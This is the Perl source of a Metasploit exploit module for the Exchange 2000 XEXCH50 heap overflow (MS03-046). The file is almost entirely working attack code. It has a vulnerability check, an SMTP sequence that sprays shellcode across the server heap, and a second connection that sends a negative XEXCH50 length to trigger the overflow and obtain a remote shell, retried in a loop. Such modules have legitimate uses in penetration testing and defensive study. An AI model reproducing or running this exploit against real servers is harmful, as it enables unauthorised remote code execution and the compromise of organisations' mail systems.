package Msf::Exploit::exchange2000_xexch50;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'Exchange 2000 MS03-46 Heap Overflow',
    'Version'  => '$Revision: 1.20 $',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 25],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },

    'Payload' => {
                 'Space'  => 1024,
                 'BadChars'  => "\x00\x0a\x0d\x20:=+\x22",
                 },
    
    'Description'  => qq{
        This is an exploit for the Exchange 2000 heap overflow. Due
        to the nature of the vulnerability, this exploit is not very
        reliable. This module has been tested against Exchange 2000
        SP0 and SP3 running a Windows 2000 system patched to SP4. It
        normally takes between one and ten tries to successfully
        obtain a shell. This exploit is *very* unreliable, we hope
        to provide a much more solid one in the near future.
    },   
    'Refs'  =>  [  
                    'http://www.osvdb.org/2674',
                    'http://www.microsoft.com/technet/security/bulletin/MS03-046.mspx'
                ],
    'DefaultTarget' => 0,
    'Targets' => [['Exchange 2000', 0x0c900c90, 11000, 20000, 1000]],
};


sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    
    my $s = Msf::Socket->new( {"SSL" => $self->GetVar("SSL")} );
    if (! $s->Tcp($target_host, $target_port)) {
        $self->PrintLine("[*] Could not connect: " . $s->GetError());
        return(0);
    }
    
    my $res = $s->Recv(-1, 20);
    if ($res !~ /Microsoft/) {
        $s->Close();
        $self->PrintLine("[*] Target does not appear to be an exchange server");
        return(0);
    }
    
    $s->Send("EHLO X\r\n");
    $res = $s->Recv(-1, 3);
    if ($res !~ /XEXCH50/) {
        $s->Close();
        $self->PrintLine("[*] Target does not appear to be an exchange server");
        return(0);
    }
    
    $s->Send("MAIL FROM: metasploit\r\n");
    $res = $s->Recv(-1, 3);
    
    $s->Send("RCPT TO: administrator\r\n");  
    $res = $s->Recv(-1, 3);
    
    $s->Send("XEXCH50 2 2\r\n");
    $res = $s->Recv(-1, 3);
    $s->Close();
    
    if ($res !~ /Send binary/) {
        $self->PrintLine("[*] Target has been patched");
        return(0);
    }

    $self->PrintLine("[*] Target appears to be vulnerable");
    return(1);
}


sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   =$self->GetVar('EncodedPayload')->Payload;


    my $target = $self->Targets->[$target_idx];           
    my ($tname, $retaddr) = @{$target};
    my $buff_len = $target->[2];

    $self->PrintLine(sprintf("[*] Trying '$tname' using return address 0x%.8x [$buff_len]", $retaddr));

    my $counter = 1;
    my @seencount = ();
    
    while (1) {
        if(! $seencount[$counter]) {
            $self->PrintLine("[*] Exploit attempt #$counter");
            $seencount[$counter]++;
        }
        
        $self->Print("[*] Connection 1: ");
        my $s = Msf::Socket->new( {"SSL" => $self->GetVar("SSL")} );
        if (! $s->Tcp($target_host, $target_port)) {
            $self->PrintLine("Error");
            sleep(5);
            next;
        }

        my $res = $s->Recv(-1, 3);
        if (! $res) {
            $self->PrintLine("Error");
            next;
        }

        if ($res !~ /Microsoft/) {
            $s->Close();
            $self->PrintLine("Error");
            $self->PrintLine("[*] Target does not appear to be running Exchange: $res");
            return;
        }

        $self->Print("EHLO ");
        $s->Send("EHLO X\r\n");
        $res = $s->Recv(-1, 3);
        if (! $res) { $self->PrintLine("Error"); next; }

        if ($res !~ /XEXCH50/) {
            $self->PrintLine("Error");
            $self->PrintLine("[*] Target is not running Exchange: $res");
            return;
        }

        $self->Print("MAIL ");
        $s->Send("MAIL FROM: metasploit\r\n");
        $res = $s->Recv(-1, 3);
        if (! $res) { $self->PrintLine("Error"); next; }

        $self->Print("RCPT ");
        $s->Send("RCPT TO: administrator\r\n");  
        $res = $s->Recv(-1, 3);
        if (! $res) { $self->PrintLine("Error"); next; }

        # verify that the server is not patched
        $s->Send("XEXCH50 2 2\r\n");
        $res = $s->Recv(-1, 3);
        if (! $res) { $self->PrintLine("Error"); next; }

        $self->Print("XEXCH50 ");
        if ($res !~ /Send binary/) {
            $s->Close();
            $self->PrintLine("Error");
            $self->PrintLine("[*] Target is not vulnerable");
            return;
        }

        $s->Send("XX");
        $res = $s->Recv(-1, 3);
        if (! $res) { $self->PrintLine("Error"); next; }

        $self->Print("ALLOC ");
        # allocate heap memory
        my $dsize = (1024 * 1024 * 32);
        $s->Send("XEXCH50 $dsize 2\r\n");
        $res = $s->Recv(-1, 3);
        $self->PrintLine("OK");

        my $payload =  (pack("V", $retaddr) x (256 * 1024) . $shellcode . ("X" x 1024)) x 4;

        $self->Print("[*] Uploading shellcode to remote heap: ");
        $s->Send($payload);
        $self->PrintLine("OK");

        $self->Print("[*] Connection 2: ");
        my $x = Msf::Socket->new( {"SSL" => $self->GetVar("SSL")} );
        if (! $x->Tcp($target_host, $target_port))
        {
            $self->PrintLine("Error");
            next;
        }
        
        $res = $x->Recv(-1, 3);
        if (! $res) { 
            $self->PrintLine("Error"); 
            $self->PrintLine("[*] No response"); 
            next; 
        }

        $self->Print("EHLO ");
        $x->Send("EHLO X\r\n");
        $res = $x->Recv(-1, 3);
        if (! $res) { $self->PrintLine("Error"); next; }

        if ($res !~ /XEXCH50/) {
            $self->PrintLine("Error");
            $self->PrintLine("[*] Target is not running Exchange: $res");
            return;
        }

        $self->Print("MAIL ");
        $x->Send("MAIL FROM: metasploit\r\n");
        $res = $x->Recv(-1, 3);
        if (! $res) { $self->PrintLine("Error"); next; }

        $self->Print("RCPT ");
        $x->Send("RCPT TO: administrator\r\n");  
        $res = $x->Recv(-1, 3);
        if (! $res) { $self->PrintLine("Error"); next; }

        $self->Print("XEXCH50 ");
        # allocate a negative value
        $x->Send("XEXCH50 -1 2\r\n");
        $res = $x->Recv(-1, 3);
        if (! $res) { 
            $self->PrintLine("Error"); 
            $self->PrintLine("[*] No response"); 
            next; 
        }
        $self->PrintLine("OK");
        
        $buff_len += $target->[4];
        if ($buff_len > $target->[3]) { $buff_len = $target->[2] }
        
        # send the massive buffer of our return address
        my $heapover = pack("V", $retaddr) x ($buff_len);
        
        $self->PrintLine("[*] Overwriting heap with payload jump ($buff_len)...");
        $x->Send($heapover);

        # reconnect until the service stops responding
        my $count = 0;
        $self->Print("[*] Starting reconnect sequences: ");
        my $tmp = Msf::Socket->new( {"SSL" => $self->GetVar("SSL")} );
        while ($count < 10 && $tmp->Tcp($target_host, $target_port)) {
            $tmp->Send("HELO X\r\n");
            $tmp->Close();
            $count++;
        }
        $self->PrintLine(" OK");
        $self->PrintLine("");
        $counter++;
    }
    return;
}


